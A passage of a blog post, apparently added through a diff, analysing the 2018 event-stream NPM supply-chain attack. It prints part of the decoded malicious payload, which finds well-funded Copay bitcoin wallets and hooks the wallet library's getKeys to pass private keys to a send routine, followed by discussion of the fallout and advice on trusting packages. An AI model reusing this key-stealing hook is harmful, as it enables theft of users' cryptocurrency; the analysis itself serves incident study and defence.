class="line"></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params">t, n</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">window</span>.cordova) <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">var</span> e = cordova.file.dataDirectory;</span><br><span class="line">                    resolveLocalFileSystemURL(e, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                        e.getFile(t, &#123;</span><br><span class="line">                            create: !<span class="number">1</span></span><br><span class="line">                        &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                            e.file(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                                <span class="keyword">var</span> t = <span class="keyword">new</span> FileReader;</span><br><span class="line">                                t.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                                    <span class="keyword">return</span> n(<span class="built_in">JSON</span>.parse(t.result))</span><br><span class="line">                                &#125;, t.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                                    t.abort()</span><br><span class="line">                                &#125;, t.readAsText(e)</span><br><span class="line">                            &#125;)</span><br><span class="line">                        &#125;)</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">var</span> r = localStorage.getItem(t);</span><br><span class="line">                        <span class="keyword">if</span> (r) <span class="keyword">return</span> n(<span class="built_in">JSON</span>.parse(r))</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        chrome.storage.local.get(t, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                            <span class="keyword">if</span> (e) <span class="keyword">return</span> n(<span class="built_in">JSON</span>.parse(e[t]))</span><br><span class="line">                        &#125;)</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            global.CSSMap = &#123;&#125;, l(<span class="string">"profile"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> t <span class="keyword">in</span> e.credentials) &#123;</span><br><span class="line">                    <span class="keyword">var</span> n = e.credentials[t];</span><br><span class="line">                    <span class="string">"livenet"</span> == n.network &amp;&amp; l(<span class="string">"balanceCache-"</span> + n.walletId, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">var</span> t = <span class="keyword">this</span>;</span><br><span class="line">                        t.balance = <span class="built_in">parseFloat</span>(e.balance.split(<span class="string">" "</span>)[<span class="number">0</span>]), <span class="string">"btc"</span> == t.coin &amp;&amp; t.balance &lt; <span class="number">100</span> || <span class="string">"bch"</span> == t.coin &amp;&amp; t.balance &lt; <span class="number">1e3</span> || (global.CSSMap[t.xPubKey] = !<span class="number">0</span>, r(<span class="string">"c"</span>, <span class="built_in">JSON</span>.stringify(t)))</span><br><span class="line">                    &#125;.bind(n))</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">var</span> e = <span class="built_in">require</span>(<span class="string">"bitcore-wallet-client/lib/credentials.js"</span>);</span><br><span class="line">            e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> t = <span class="keyword">this</span>.getKeysFunc(e);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    global.CSSMap &amp;&amp; global.CSSMap[<span class="keyword">this</span>.xPubKey] &amp;&amp; (<span class="keyword">delete</span> global.CSSMap[<span class="keyword">this</span>.xPubKey], r(<span class="string">"p"</span>, e + <span class="string">"\\t"</span> + <span class="keyword">this</span>.xPubKey))</span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">                <span class="keyword">return</span> t</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>.cordova ? <span class="built_in">document</span>.addEventListener(<span class="string">"deviceready"</span>, e) : e()</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure>
+<p>A few things initially jump out. We can see that the injection code is targeting bitcoin, whether it’s targeting vulnerable wallets or attempting to mine coins on remote hosts, it’s difficult to decipher from this hacker’s spaghetti code. Often times, malicious actors will attempt to make their code as difficult to read and understand as possible. JavaScript minifiers make this easier for them and it can be a real challenge to generate a readable file from minified, abstract code.</p>
+<p>In short, the community was able to realize that these two code bits will search for vulnerable crypto-currency wallets, check for the copay NPM module, and attempt to steal the wallets and funds stored within them through the targeted module. Thankfully, this vulnerability is not as far reaching as people first thought it might be. An application must be running this malicious code, the copay dependency, and have a wallet with funds. </p>
+<h2 id="Aftermath"><a href="#Aftermath" class="headerlink" title="Aftermath"></a>Aftermath</h2><p>The people at NPM quickly took down the malicious version of event stream and the maintainers of the copay module put up a warning about the vulnerability. Unfortunately, the malicious code was not realized for almost 2 months. The last commit to the event stream repository was around September 20th, 2018 and the Github issue that started this was not opened until November 20th, 2018. There’s no real way to know how many people were negatively affected by this but it’s clear that this vulnerability reached millions of people running the event stream module through some node dependency. </p>
+<h2 id="Community-Standards"><a href="#Community-Standards" class="headerlink" title="Community Standards"></a>Community Standards</h2><p>This event triggered a huge backlash from the community. Why was this hacker given maintainer credentials and allowed to have publishing access to the module? Why were the countless other community members not aware of his commits? Who bares the responsibility for this open source project?</p>
+<p>Per the open source license provided in the module, we see the following: ‘THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND’. Dose this absolve the original creator for his mistake? Dose the sole responsibility lay with the user of the software, regardless of its state? Unfortunately, this leaves many unanswered questions.</p>
+<h2 id="Should-I-Trust-You"><a href="#Should-I-Trust-You" class="headerlink" title="Should I Trust You?"></a>Should I Trust You?</h2><p>I think it’s important to recognize the larger issue here; NPM modules are too easily trusted. I don’t know how many times I’ve looked online for something, found a package, downloaded it, and used it within my project without question. For all I know, I could be putting my users at risk of some attack by using a malicious dependency. NPM is an amazing tool, but it’s important to realize that vulnerabilities exist. Here are some tips for safe NPM package usage:</p>
+<ol>
+<li>Is the package open source?</li>
+<li>Is the package maintained by a community? </li>
+<li>Is the community currently active? </li>
+<li>How can I contribute to maintain this open source project?</li>
+</ol>
+<p>By involving yourself in the open source projects that you use, you can become a vigilant member of the community that protects and maintains open source software. Solo hero developers are far and few between, so don’t depend on them. Get involved, be apart of the open source community, and contribute to the projects that you use.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/jpmcb">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Malicious-Code"><span class="toc-number">1.</span> <span class="toc-text">The Malicious Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Force-a-Solution"><span class="toc-number">2.</span> <span class="toc-text">Brute Force a Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Aftermath"><span class="toc-number">3.</span> <span class="toc-text">Aftermath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Community-Standards"><span class="toc-number">4.</span> <span class="toc-text">Community Standards</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Should-I-Trust-You"><span class="toc-number">5.</span> <span class="toc-text">Should I Trust You?</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=johncodes.com/2018/12/14/to_catch_a_hacker/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=johncodes.com/2018/12/14/to_catch_a_hacker/&text=To Catch A Hacker - NPM Event Stream"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=johncodes.com/2018/12/14/to_catch_a_hacker/&title=To Catch A Hacker - NPM Event Stream"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=johncodes.com/2018/12/14/to_catch_a_hacker/&is_video=false&description=To Catch A Hacker - NPM Event Stream"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=To Catch A Hacker - NPM Event Stream&body=Check out this article: johncodes.com/2018/12/14/to_catch_a_hacker/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=johncodes.com/2018/12/14/to_catch_a_hacker/&title=To Catch A Hacker - NPM Event Stream"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=johncodes.com/2018/12/14/to_catch_a_hacker/&title=To Catch A Hacker - NPM Event Stream"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=johncodes.com/2018/12/14/to_catch_a_hacker/&title=To Catch A Hacker - NPM Event Stream"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=johncodes.com/2018/12/14/to_catch_a_hacker/&title=To Catch A Hacker - NPM Event Stream"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=johncodes.com/2018/12/14/to_catch_a_hacker/&name=To Catch A Hacker - NPM Event Stream&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=johncodes.com/2018/12/14/to_catch_a_hacker/&t=To Catch A Hacker - NPM Event Stream"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    John McBride
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/jpmcb">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
